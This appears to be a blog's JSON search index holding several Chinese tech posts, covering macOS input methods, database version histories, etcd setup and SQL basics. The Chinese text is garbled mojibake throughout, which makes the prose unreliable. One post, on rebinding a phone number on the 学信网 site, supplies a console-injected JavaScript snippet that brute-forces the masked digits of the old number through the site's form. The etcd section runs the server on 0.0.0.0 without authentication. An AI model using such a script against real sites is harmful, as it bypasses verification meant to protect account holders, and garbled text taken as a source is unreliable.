è®¾ç½®ç¬¬ä¸‰æ–¹è¾“å…¥æ³•åœ¨ç¬¬ä¸€ä½\n\nç³»ç»Ÿåå¥½â†’è¯­è¨€ä¸åœ°åŒºâ†’é¦–é€‰è¯­è¨€ï¼ˆé€‰æ‹©ä¸­æ–‡ï¼‰â†’æˆåŠŸï¼ˆæœç‹—å°±æ’ç¬¬ä¸€äº†ï¼‰\n\nå½“ç„¶è¿™é‡Œçš„å‰ææ˜¯æŠŠç³»ç»Ÿè‡ªå¸¦çš„è‹±æ–‡è¾“å…¥æ³•å»æ‰ã€‚\n\nåšæ³•å°±æ˜¯ï¼Œç³»ç»Ÿåå¥½è®¾ç½®â†’è¾“å…¥æ³•â†’â•å·æ·»åŠ  å¨å°”å£«ğŸ´ó §ó ¢ó ·ó ¬ó ³ó ¿ â†’é€‰ä¸­ç³»ç»Ÿè‡ªå¸¦è‹±æ–‡ï¼Œâ–å·â†’æˆåŠŸã€‚\n\n\n\n### 2. è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•(æ¨è)\n\nAPPStore æœç´¢è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•, ä¸‹è½½ä½¿ç”¨å³å¯\n\nåœ¨è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•å†…ï¼Œæå‰è®¾ç½®æ¯ä¸ªAppå¯¹åº”çš„è¾“å…¥æ³•ï¼Œåˆ‡æ¢è‡³è¯¥Appæ—¶ï¼Œå°†ä¸ºæ‚¨è‡ªåŠ¨åˆ‡æ¢è‡³ä¸ºä»–è®¾å®šå¥½çš„è¾“å…¥æ³•ã€‚\n\nå¯¹åˆ‡æ¢é‡åº¦ç”¨æˆ·ï¼Œè‡ªåŠ¨åˆ‡æ¢å°†ä¸ºæ‚¨å‡å°‘95%ä»¥ä¸Šçš„æ‰‹åŠ¨åˆ‡æ¢æ¬¡æ•°ï¼Œå¤§å¹…æå‡è¾“å…¥ä½“éªŒã€‚\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/21466262\n+ https://www.better365.cn/AutoSwitchInput.html\n+ https://github.com/utatti/kawa\n\n","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"sqlå†å²ç‰ˆæœ¬ä»‹ç»","url":"%2Fp%2Fdb4b5549.html","content":"\n# 1. mysql\n\n| ç‰ˆæœ¬   | äº‹ä»¶                                                         | æ—¶é—´       | New                                                         |\n| ------ | ------------------------------------------------------------ | ---------- | ----------------------------------------------------------- |\n| 1.0    |1995       | ä»…ä¾›å†…éƒ¨ä½¿ç”¨                                                 |                                                              |\n| 3.11.1 |1996       |       First release                                                |                                                        |\n| 4.0    | 2002       |   æŸ¥è¯¢ç¼“å­˜ï¼Œè”åˆï¼Œå…¨æ–‡ï¼ŒInnoDB                                 |                                                           |\n| 5.0    | 2005       |        å­˜å‚¨çš„Routiesï¼Œè§†å›¾ï¼Œæ¸¸æ ‡ï¼Œè§¦å‘å™¨ï¼ŒXAäº‹åŠ¡ï¼ŒI_S               |                                                      |\n| 5.1    |2008-11-14 | äº‹ä»¶è°ƒåº¦ç¨‹åºï¼Œåˆ†ç±»ï¼Œæ’ä»¶APIï¼ŒRBRï¼ŒInnoDBæ’ä»¶ï¼ŒMySQLç¾¤é›†      |                                                              |\n| 5.5    |2010-12-03 |  InnoDBä»£æ›¿MyISAMæˆä¸ºMySQLé»˜è®¤çš„å­˜å‚¨å¼•æ“ã€‚                    |                                                             |\n| 5.6    | 2013-02-05 | åœ¨çº¿DDLï¼ŒGTIDï¼Œå¹¶è¡Œå¤åˆ¶ï¼ŒICPï¼ŒMRR......MySQL 5.6æ˜¯MySQLå†å²ä¸Šä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„ç‰ˆæœ¬ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰ç”Ÿäº§ä¸Šåº”ç”¨å¾—æœ€å¹¿æ³›çš„ç‰ˆæœ¬ã€‚ | https://dev.mysql.com/doc/refman/5.6/en/mysql-nutshell.html |\n| 5.7    | 2015-10-21 |ç»„å¤åˆ¶,InnoDB Cluster,å¤šæºå¤åˆ¶, JSONæ”¯æŒ                     |  https://dev.mysql.com/doc/refman/5.7/en/mysql-nutshell.html |\n| 8.0    |2018-04-19 | ä¸å¯è§ç´¢å¼•,é™åºç´¢å¼•                                          |  https://dev.mysql.com/doc/refman/8.0/en/mysql-nutshell.html |\n\n<!-- more -->\n\n# 2. pgsql\n| ç‰ˆæœ¬   | æ—¶é—´                                                       | äº‹ä»¶ |\n| :----- | :----------------------------------------------------------: | :--: |\n| 6.0 | 1997-01-29|PostgreSQLé¦–æ¬¡å‘è¡Œå³é€‰æ‹©6.0ä½œä¸ºå…¶ç‰ˆæœ¬å·ï¼Œå”¯ä¸€ç´¢å¼•ï¼Œpg_dumpallå®ç”¨ç¨‹åºï¼Œèº«ä»½éªŒè¯ |\n| 8.0 | 2005-01-19|Microsoft Windowsä¸Šçš„æœ¬æœºæœåŠ¡å™¨ï¼Œä¿å­˜ç‚¹ï¼Œè¡¨ç©ºé—´ï¼Œæ—¶é—´ç‚¹æ¢å¤ |\n| 9.2 | 2012-09-10|çº§è”æµå¤åˆ¶ï¼Œä»…ç´¢å¼•æ‰«æï¼Œæœ¬æœºJSONæ”¯æŒï¼Œæ”¹è¿›çš„é”ç®¡ç†ï¼ŒèŒƒå›´ç±»å‹ï¼Œpg_receivexlogå·¥å…·ï¼Œç©ºé—´åˆ†åŒºçš„GiSTç´¢å¼• |\n| 9.4 | 2014-12-18 |JSONBæ•°æ®ç±»å‹ï¼Œç”¨äºæ›´æ”¹é…ç½®å€¼çš„ALTER SYSTEMè¯­å¥ï¼Œæ— éœ€é˜»å¡è¯»å–å³å¯åˆ·æ–°å®ä¾‹åŒ–è§†å›¾çš„åŠŸèƒ½ï¼Œåå°å·¥ä½œè¿›ç¨‹çš„åŠ¨æ€æ³¨å†Œ/å¯åŠ¨/åœæ­¢ï¼Œé€»è¾‘è§£ç APIï¼ŒGiNç´¢å¼•æ”¹è¿›ï¼ŒLinuxå¤§é¡µé¢æ”¯æŒï¼Œé€šè¿‡pg_prewarmé‡æ–°åŠ è½½æ•°æ®åº“ç¼“å­˜ ï¼Œå°†Hstoreé‡æ–°å¼•å…¥ä¸ºæ–‡æ¡£æ ·å¼æ•°æ®çš„é€‰æ‹©åˆ—ç±»å‹ã€‚ |\n| 9.6 |2016-09-29| å¹¶è¡ŒæŸ¥è¯¢æ”¯æŒï¼ŒPostgreSQLå¤–éƒ¨æ•°æ®åŒ…è£…å™¨ï¼ˆFDWï¼‰çš„æ”¹è¿›ï¼ˆé€šè¿‡æ’åº/è”æ¥ä¸‹æ¨ï¼‰ï¼Œå¤šä¸ªåŒæ­¥å¤‡ç”¨æ•°æ®åº“ï¼Œæ›´å¿«çš„å¤§è¡¨æ¸…ç† |\n| 10 | 2017-10-05|é€»è¾‘å¤åˆ¶ï¼Œå£°æ˜æ€§è¡¨åˆ†åŒºï¼Œæ”¹è¿›çš„æŸ¥è¯¢å¹¶è¡Œæ€§ |\n| 11 |2018-10-18| å¢å¼ºäº†åˆ†åŒºçš„å¥å£®æ€§å’Œæ€§èƒ½ï¼Œå­˜å‚¨è¿‡ç¨‹ä¸­æ”¯æŒçš„äº‹åŠ¡ï¼Œå¢å¼ºçš„æŸ¥è¯¢å¹¶è¡Œæ€§åŠŸèƒ½ï¼Œè¡¨è¾¾å¼çš„å®æ—¶ï¼ˆJITï¼‰ç¼–è¯‘ |\n| 12 | 2019-10-03|æ”¹è¿›æŸ¥è¯¢æ€§èƒ½å’Œç©ºé—´åˆ©ç”¨ç‡ï¼› SQL / JSONè·¯å¾„è¡¨è¾¾å¼æ”¯æŒï¼› ç”Ÿæˆçš„åˆ—ï¼› æ”¹å–„å›½é™…åŒ–å’Œè®¤è¯ï¼› æ–°çš„å¯æ’å…¥è¡¨å­˜å‚¨æ¥å£ã€‚ |\n| 13 |2020-09-24| Bæ ‘ç´¢å¼•æ¡ç›®çš„é‡å¤æ•°æ®åˆ é™¤èŠ‚çœäº†ç©ºé—´å¹¶æé«˜äº†æ€§èƒ½ï¼Œæ”¹è¿›äº†ä½¿ç”¨èšåˆæˆ–åˆ†åŒºè¡¨çš„æŸ¥è¯¢çš„æ€§èƒ½ï¼Œä½¿ç”¨æ‰©å±•ç»Ÿè®¡ä¿¡æ¯æ—¶æ›´å¥½çš„æŸ¥è¯¢è®¡åˆ’ï¼Œç´¢å¼•çš„å¹¶è¡Œæ¸…ç†ï¼Œå¢é‡æ’åºã€‚ |\n\n\n\n# 3. redis\n\n| ç‰ˆæœ¬ | æ—¶é—´           | äº‹ä»¶                                                         |\n| ---- | -------------- | ------------------------------------------------------------ |\n| 2.6  | 2012å¹´         | æœåŠ¡ç«¯æ”¯æŒLuaè„šæœ¬ã€‚                                          |\n| 2.8  | 2013å¹´11æœˆ22æ—¥ | å‘å¸ƒè®¢é˜…æ·»åŠ äº†pubsubå‘½ä»¤,slaveæ”¯æŒä»masteréƒ¨åˆ†åŒæ­¥           |\n| 3.0  | 2015å¹´4æœˆ1æ—¥   | Redis Clusterï¼šRedisçš„å®˜æ–¹åˆ†å¸ƒå¼å®ç°ã€‚                       |\n| 3.2  | 2016å¹´5æœˆ6æ—¥   | æ–°çš„Listç¼–ç ç±»å‹ï¼šquicklist,æ–°çš„RDBæ ¼å¼ã€‚                    |\n| 4.0  | 2017å¹´7æœˆ14æ—¥  | PSYNC2.0ï¼šä¼˜åŒ–äº†ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œä¸»ä»èŠ‚ç‚¹åˆ‡æ¢å¿…ç„¶å¼•èµ·å…¨é‡å¤åˆ¶çš„é—®é¢˜ã€‚<br/>æä¾›äº†RDB-AOFæ··åˆæŒä¹…åŒ–æ ¼å¼ï¼Œå……åˆ†åˆ©ç”¨äº†AOFå’ŒRDBå„è‡ªä¼˜åŠ¿ã€‚ |\n| 5.0  | 2018å¹´10æœˆ     | æ–°çš„æµæ•°æ®ç±»å‹(Stream data type)                             |\n| 6.0  | 2020 å¹´5æœˆ2æ—¥  | å¤šçº¿ç¨‹                                                       |\n\n\n\n# 4. mongodb\n\n| ç‰ˆæœ¬  | æ—¶é—´          | äº‹ä»¶                                                   |\n| ----- | ------------- | ------------------------------------------------------ |\n| 1.0   | 2009          | é¦–æ¬¡åœ¨æ•°æ®åº“é¢†åŸŸäº®ç›¸ï¼Œæ‰“ç ´äº†å…³ç³»å‹æ•°æ®åº“ä¸€ç»Ÿå¤©ä¸‹çš„å±€é¢ |\n| 2.0.6 | 2012          |                                                        |\n| 2.4.8 | 2013          |                                                        |\n| 3.0.1 | 2017          |                                                        |\n| 4.0.2 | 2018          | æ”¯æŒå¤šæ–‡æ¡£äº‹åŠ¡                                         |\n| 5.0   | 2019          | å¼•å…¥åˆ†å¸ƒå¼äº‹åŠ¡                                         |\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://en.wikipedia.org/wiki/MySQL\n+ https://en.wikipedia.org/wiki/PostgreSQL","tags":["sql"],"categories":["sql"]},{"title":"å­¦ä¿¡ç½‘æ³¨å†Œæ‰‹æœºå·ç å¿˜è®°äº†æ”¹ç»‘æ‰‹æœº","url":"%2Fp%2Fc27fdcd6.html","content":"\n\nç™»å½•å­¦ä¿¡ç½‘, å‘ç°æ‰‹æœºå·è¿˜æ˜¯å¤§å­¦æ—¶å€™ç”¨çš„æ‰‹æœºå·,  å·ç éƒ½å¿˜è®°äº†, æ”¹ç»‘ç°åœ¨çš„æ‰‹æœºè¿˜éœ€è¦å¿…å¡«ä»¥å‰çš„æ‰‹æœºå·. \n\nä¹‹å‰çš„æ‰‹æœºå·ä¸­é—´å››ä½æ˜¯`****`, æ‰€ä»¥ä¸€å…±æœ‰10000ç§å¯èƒ½.\n\n<!-- more -->\n\n# 1. è§£å†³æ–¹æ¡ˆ\n\n\n\n### 1.1 æš´åŠ›ç ´è§£\n\næ¯æ—¥éªŒè¯ç æ¬¡æ•°æœ‰é™, ä¸å»ºè®®.\n\n\n\n### 1.2 è·å–æ‰‹æœºå·ä¿¡æ¯(æœ€æœ‰æ•ˆ)\n\n1ï¼Œç”¨ä½ å­¦ä¿¡ç½‘çš„è´¦å·ç™»å½• é˜³å…‰é«˜è€ƒ https://gaokao.chsi.com.cn/\n\n2ï¼Œç‚¹å‡»å³è¾¹ ç‰¹æ®Šç±»å‹æ‹›ç”Ÿå…¥å£  \n\n3ï¼Œç‚¹å‡»å³è¾¹ æŠ¥åç™»å½• è¿›å»éšä¾¿é€‰æ‹©ä¸€ä¸ªï¼Œå¦‚ï¼šé«˜æ°´å¹³è¿åŠ¨å‘˜  è‰ºæœ¯ç±»\n\n4ï¼Œè¿›å…¥æŠ¥åï¼ŒåŒæ„æ¡æ¬¾ï¼Œç¡®è®¤èº«ä»½è¯ï¼Œåˆ°ä¸ªäººä¿¡æ¯çš„æ—¶å€™å°±èƒ½çœ‹è§ç”µè¯å·ç äº†ã€‚\n\n\n\n### 1.3 æŠ€æœ¯æ–¹æ¡ˆ\n\nå­¦ä¿¡ç½‘é€šè¿‡åŠ å¯†æ–¹å¼æ˜¾ç¤ºæ‰‹æœºå·ï¼Œéšè—äº†åŸæ¥æ‰‹æœºå·çš„ä¸­é—´4ä½ï¼Œä¿®æ”¹æ‰‹æœºå·çš„æ—¶å€™éœ€è¦æä¾›åŸæ¥æ‰‹æœºå·ï¼Œå¹¶ä¸”éœ€è¦æ–°æ‰‹æœºå·æ¥æ”¶ä¸€ä¸ªéªŒè¯ç ï¼Œå¹¸è¿çš„æ˜¯è¿™ä¸ªéªŒè¯ç æ˜¯24å°æ—¶å†…æœ‰æ•ˆï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£çš„æ–¹å¼ï¼Œæ¯2ç§’é’Ÿå°è¯•ä¸€ä¸ªç”µè¯å·ç ï¼Œæœ€å¤šä¼šå°è¯•10000æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€é•¿æ—¶é—´éœ€è¦è€—æ—¶20000ç§’ï¼ˆå¤§çº¦5ä¸ªåŠå°æ—¶ï¼‰ï¼Œä¸è¿‡ä¸€èˆ¬ä¸ä¼šé‚£ä¹ˆç‚¹èƒŒï¼Œå°è¯•åˆ°9999çš„æ—¶å€™æ‰ä¿®æ”¹æˆåŠŸã€‚å½“ç„¶è¿™ä¸ªä¸å¯èƒ½äººå·¥å»å®Œæˆç ´è§£ï¼Œéœ€è¦å†™ä»£ç ã€‚\n\nè™½ç„¶æˆ‘åœ¨ä¸­é€”æµ‹è¯•ä¸­æ”¾å¼ƒäº†, ä½†æ˜¯è‡´æ•¬è¿™ä½å¤§ä½¬.  å‚è€ƒ: http://www.jsunw.com/?post=36\n\n1. é€šè¿‡firefoxæˆ–è€…chromeæ‰“å¼€æ‰‹æœºå·ç¼–è¾‘é¡µé¢ï¼Œé¦–å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ªåŸæ‰‹æœºå·ï¼Œä¿®æ”¹ä¸€æ¬¡ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ‹¿åˆ°éªŒè¯ç \n2. æ‰“å¼€æ§åˆ¶å°ï¼Œå®šä½è‡³â€œç¡®å®šâ€æŒ‰é’®\n3. å³é”®è¿™ä¸ª`<input>`æ ‡ç­¾ï¼Œç¼–è¾‘htmlä»£ç ï¼Œåœ¨è¿™ä¸ª`<input>`æ ‡ç­¾åé¢æ·»åŠ ä¸‹é¢ä»£ç ï¼š\n\n```html\n<input type=\"button\" value=\"start\" onclick=\"(function (btn, form, input, start, iframeName, speed) {if (!form.attr('target')) {$('<iframe></iframe>').attr('name', iframeName).insertBefore(form.attr('target', iframeName));}if (window.jsunw == null) {input.val(start);}if (window.jsunw) {clearInterval(window.jsunw);window.jsunw = 0;btn.val('go on').attr('title', 'start');} else {window.jsunw = setInterval(function () {if (parseInt(input.val().replace(/(\\d{3})\\d{4}(\\d{4})/g, '$10000$2')) != start) {input.val(start);}var v = parseInt(input.val());v = v > (start + 99990000) ? start : v + 10000;input.val(v);}, speed);btn.val('working...').attr('title', 'pause');}})($(this), $(this).closest('form'), $(this).closest('tbody').find('[name=oldMobilePhone]'), parseInt($(this).closest('#setPhone').find('>strong').text().replace(/\\*/g, '0')), 'setPhoneTarget', 2000);\">\n```\n\nå¦‚ä¸‹å›¾:\n\n![1](http://www.jsunw.com/content/uploadfile/201806/eabe1529569128.png)\n\n4. åœ¨é¡µé¢ä¸­å•å‡»æ–°æ·»åŠ çš„è¿™ä¸ªæŒ‰é’®åï¼ŒæŸ¥çœ‹â€œåŸæ‰‹æœºå·â€å¯¹åº”çš„è¾“å…¥æ¡†ï¼Œé‡Œé¢çš„æ‰‹æœºå·åº”è¯¥æ¯éš”ä¸¤ç§’è‡ªåŠ¨æ”¹å˜ä¸€æ¬¡ï¼Œè¿™å°±è¯´æ˜ç ´è§£è„šæœ¬æ­£åœ¨æ‰§è¡Œã€‚\n\n5. ä¿æŒè¿™ä¸ªé¡µé¢ä¸è¦åŠ¨ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¦å¤–æ‰“å¼€ä¸€ä¸ªé¡µé¢æŸ¥çœ‹æ‰‹æœºå·æ˜¯å¦å·²ç»ä¿®æ”¹ï¼Œå¦‚æœä¿®æ”¹æˆåŠŸï¼Œé‚£å°±æ­å–œä½ äº†ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å…³é—­è¿™ä¸ªè„šæœ¬é¡µé¢äº†ã€‚\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://zhidao.baidu.com/question/585034076726360365.html\n+ http://www.jsunw.com/?post=36","tags":["å­¦ä¿¡ç½‘"],"categories":["ä¸ªäººè®°å½•"]},{"title":"etcdçš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2Fc0b47ece.html","content":"\n\n\n# 1. etcd ä»‹ç»\n\n[etcd](https://etcd.io/)æ˜¯ä½¿ç”¨Goè¯­è¨€å¼€å‘çš„ä¸€ä¸ªå¼€æºçš„ã€é«˜å¯ç”¨çš„åˆ†å¸ƒå¼key-valueå­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥ç”¨äºé…ç½®å…±äº«å’ŒæœåŠ¡çš„æ³¨å†Œå’Œå‘ç°ã€‚ç±»ä¼¼é¡¹ç›®æœ‰zookeeperå’Œconsulã€‚\n\netcdå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n\n- å®Œå…¨å¤åˆ¶ï¼šé›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥ä½¿ç”¨å®Œæ•´çš„å­˜æ¡£\n- é«˜å¯ç”¨æ€§ï¼šEtcdå¯ç”¨äºé¿å…ç¡¬ä»¶çš„å•ç‚¹æ•…éšœæˆ–ç½‘ç»œé—®é¢˜\n- ä¸€è‡´æ€§ï¼šæ¯æ¬¡è¯»å–éƒ½ä¼šè¿”å›è·¨å¤šä¸»æœºçš„æœ€æ–°å†™å…¥\n- ç®€å•ï¼šåŒ…æ‹¬ä¸€ä¸ªå®šä¹‰è‰¯å¥½ã€é¢å‘ç”¨æˆ·çš„APIï¼ˆgRPCï¼‰\n- å®‰å…¨ï¼šå®ç°äº†å¸¦æœ‰å¯é€‰çš„å®¢æˆ·ç«¯è¯ä¹¦èº«ä»½éªŒè¯çš„è‡ªåŠ¨åŒ–TLS\n- å¿«é€Ÿï¼šæ¯ç§’10000æ¬¡å†™å…¥çš„åŸºå‡†é€Ÿåº¦\n- å¯é ï¼šä½¿ç”¨Raftç®—æ³•å®ç°äº†å¼ºä¸€è‡´ã€é«˜å¯ç”¨çš„æœåŠ¡å­˜å‚¨ç›®å½•\n\n<!-- more -->\n\n# 2. etcd å®‰è£…å’Œä½¿ç”¨\n\n### 2.1 ä¸‹è½½å®‰è£…\n\nhttps://github.com/etcd-io/etcd/releases\n\n```bash\nETCD_VER=v3.4.13\n\n# choose either URL\nGOOGLE_URL=https://storage.googleapis.com/etcd\nGITHUB_URL=https://github.com/etcd-io/etcd/releases/download\nDOWNLOAD_URL=${GOOGLE_URL}\n\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\nrm -rf /tmp/etcd-download-test && mkdir -p /tmp/etcd-download-test\n\ncurl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\ntar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1\nrm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz\n\n/tmp/etcd-download-test/etcd --version\n/tmp/etcd-download-test/etcdctl version\n```\n\n\n\n### 2.2 å¯åŠ¨\n\nä¸ºäº†æ–¹ä¾¿, ç§»åŠ¨åˆ°ç¯å¢ƒå˜é‡ä¸‹\n\n```bash\nmv /tmp/etcd-download-test/etcd /usr/local/bin/\nmv /tmp/etcd-download-test/etcdctl /usr/local/bin/\n```\n\n+ å¯åŠ¨\n\n```bash\netcd\n\nnohup etcd --listen-client-urls http://0.0.0.0:2379 --advertise-client-urls http://0.0.0.0:2379 &\n```\n\n+ etcd TCP ports\n\nThe [official etcd ports](http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt) å¯¹äºå®¢æˆ·ç«¯è¯·æ±‚æ˜¯2379ï¼Œå³curl set get æ—¶ç”¨çš„ç«¯å£ã€‚èŠ‚ç‚¹é—´é€šä¿¡ç«¯å£æ˜¯2380ã€‚\n\n\n\n### 2.3 æ“ä½œ\n\n```bash\netcdctl put mykey \"this is awesome\"\n#OK\n\netcdctl get mykey\n#mykey\n#this is awesome\n\netcdctl del mykey\n#1\n\netcdctl get mykey\n#\n\n\n# è·å–æ‰€æœ‰çš„é”®å€¼\netcdctl get / --prefix --keys-only\netcdctl get \"\" --prefix --keys-only | sed '/^\\s*$/d'\n```\n\n\n\n### 2.4 é›†ç¾¤\n\n```\netcd --config-file etcd.conf\n```\n\netcd1.conf\n\n```bash\nname: etcd-1\ndata-dir: /data/server/etcd/data\nlisten-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nadvertise-client-urls: http://172.21.0.17:2379,http://127.0.0.1:2379\nlisten-peer-urls: http://172.21.0.17:2380 # ç›‘å¬çš„\ninitial-advertise-peer-urls: http://172.21.0.17:2380\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: new\n```\n\netcd2.conf\n\n```bash\nname: etcd-2\ndata-dir: /data/server/etcd2/data\nlisten-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nadvertise-client-urls: http://172.21.0.17:2389,http://127.0.0.1:2389\nlisten-peer-urls: http://172.21.0.17:2390 # ç›‘å¬çš„\ninitial-advertise-peer-urls: http://172.21.0.17:2390\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\ninitial-cluster-token: etcd-cluster-token\ninitial-cluster-state: existing\n```\n\netcd3.conf\n\n```bash\n# èŠ‚ç‚¹åç§°\nname: etcd-3 \n\n# æ•°æ®å­˜å‚¨ç›®å½•\ndata-dir: /data/server/etcd/data \n\n# ç›‘å¬åœ¨å®¢æˆ·ç«¯æµé‡ä¸Šçš„URLåˆ—è¡¨ï¼Œè¯¥å‚æ•°å‘Šè¯‰etcdåœ¨æŒ‡å®šçš„åè®®://IP:portç»„åˆä¸Šæ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„ä¼ å…¥è¯·æ±‚ã€‚\nlisten-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379 \n\n# æ­¤æˆå‘˜çš„å®¢æˆ·ç«¯URLçš„åˆ—è¡¨ï¼Œè¿™äº›URLå¹¿æ’­ç»™é›†ç¾¤çš„å…¶ä½™éƒ¨åˆ†ã€‚ è¿™äº›URLå¯ä»¥åŒ…å«åŸŸåã€‚\nadvertise-client-urls: http://172.21.0.15:2379,http://127.0.0.1:2379\n\n# ç›‘å¬åœ¨å¯¹ç­‰èŠ‚ç‚¹æµé‡ä¸Šçš„URLåˆ—è¡¨ï¼Œè¯¥å‚æ•°å‘Šè¯‰etcdåœ¨æŒ‡å®šçš„åè®®://IP:portç»„åˆä¸Šæ¥å—æ¥è‡ªå…¶å¯¹ç­‰æ–¹çš„ä¼ å…¥è¯·æ±‚ã€‚\nlisten-peer-urls: http://172.21.0.15:2380\n\n# æ­¤æˆå‘˜çš„å¯¹ç­‰URLçš„åˆ—è¡¨ï¼Œä»¥é€šå‘Šåˆ°é›†ç¾¤çš„å…¶ä½™éƒ¨åˆ†ã€‚ è¿™äº›åœ°å€ç”¨äºåœ¨é›†ç¾¤å‘¨å›´ä¼ é€etcdæ•°æ®ã€‚ æ‰€æœ‰é›†ç¾¤æˆå‘˜å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªè·¯ç”±ã€‚ è¿™äº›URLå¯ä»¥åŒ…å«åŸŸåã€‚\ninitial-advertise-peer-urls: http://172.21.0.15:2380\n\n# å¯åŠ¨é›†ç¾¤çš„åˆå§‹åŒ–é…ç½®\ninitial-cluster: etcd-1=http://172.21.0.17:2380,etcd-2=http://172.21.0.17:2390,etcd-3=http://172.21.0.15:2380\n\n# å¼•å¯¼æœŸé—´etcdç¾¤é›†çš„åˆå§‹é›†ç¾¤ä»¤ç‰Œã€‚\ninitial-cluster-token: etcd-cluster-token\n\n# åˆå§‹ç¾¤é›†çŠ¶æ€ï¼ˆâ€œæ–°â€æˆ–â€œç°æœ‰â€ï¼‰ã€‚ å¯¹äºåœ¨åˆå§‹é™æ€æˆ–DNSå¼•å¯¼è¿‡ç¨‹ä¸­å­˜åœ¨çš„æ‰€æœ‰æˆå‘˜ï¼Œå°†å…¶è®¾ç½®ä¸ºnewã€‚ å¦‚æœæ­¤é€‰é¡¹è®¾ç½®ä¸ºexistingï¼Œåˆ™etcdå°†å°è¯•åŠ å…¥ç°å­˜é›†ç¾¤ã€‚ å¦‚æœè®¾ç½®äº†é”™è¯¯çš„å€¼ï¼Œetcdå°†å°è¯•å¯åŠ¨ï¼Œä½†ä¼šå®‰å…¨åœ°å¤±è´¥ã€‚\ninitial-cluster-state: new\n```\n\n\n\n`etcdctl member list`\n\n```\nhash1: name=etcd-1 peerURLs=http://172.21.0.17:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.17:2379 isLeader=false\n\nhash2: name=etcd-2 peerURLs=http://172.21.0.17:2390 clientURLs=http://127.0.0.1:2389,http://172.21.0.17:2389 isLeader=false\n\nhash3: name=etcd-3 peerURLs=http://172.21.0.15:2380 clientURLs=http://127.0.0.1:2379,http://172.21.0.15:2379 isLeader=true\n```\n\n\n\n# 3. golang ä½¿ç”¨ etcd\n\nhttps://github.com/etcd-io/etcd/tree/master/client\n\n```bash\ngo get go.etcd.io/etcd/v3/client\n```\n\nä»£ç :\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"time\"\n\t\"context\"\n\n\t\"go.etcd.io/etcd/v3/client\"\n)\n\nfunc main() {\n\tcfg := client.Config{\n\t\tEndpoints:               []string{\"http://127.0.0.1:2379\"},\n\t\tTransport:               client.DefaultTransport,\n\t\t// set timeout per request to fail fast when the target endpoint is unavailable\n\t\tHeaderTimeoutPerRequest: time.Second,\n\t}\n\tc, err := client.New(cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tkapi := client.NewKeysAPI(c)\n\t// set \"/foo\" key with \"bar\" value\n\tlog.Print(\"Setting '/foo' key with 'bar' value\")\n\tresp, err := kapi.Set(context.Background(), \"/foo\", \"bar\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Set is done. Metadata is %q\\n\", resp)\n\t}\n\t// get \"/foo\" key's value\n\tlog.Print(\"Getting '/foo' key value\")\n\tresp, err = kapi.Get(context.Background(), \"/foo\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t} else {\n\t\t// print common key info\n\t\tlog.Printf(\"Get is done. Metadata is %q\\n\", resp)\n\t\t// print value\n\t\tlog.Printf(\"%q key has %q value\\n\", resp.Node.Key, resp.Node.Value)\n\t}\n}\n```\n\n\n\n### 3.1 æŠ¥é”™ undefined: balancer.PickOptions\n\nå…·ä½“æ“ä½œæ–¹æ³•æ˜¯åœ¨go.modé‡ŒåŠ ä¸Šï¼š\n\n```go\nreplace google.golang.org/grpc => google.golang.org/grpc v1.26.0\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/etcd-io/etcd\n+ https://blog.pytool.com/devops/etcd/etcdctl/\n+ https://www.liwenzhou.com/posts/Go/go_etcd/\n+ https://www.cnblogs.com/cbkj-xd/p/11934599.html","tags":["etcd"],"categories":["ä¸­é—´ä»¶"]},{"title":"sqlå¸¸è§åŸºç¡€çŸ¥è¯†","url":"%2Fp%2Fab5fc61f.html","content":"\n\n# 1. mysql æ•°å€¼æ•°æ®ç±»å‹\n\nMySQLæ”¯æŒæ‰€æœ‰æ 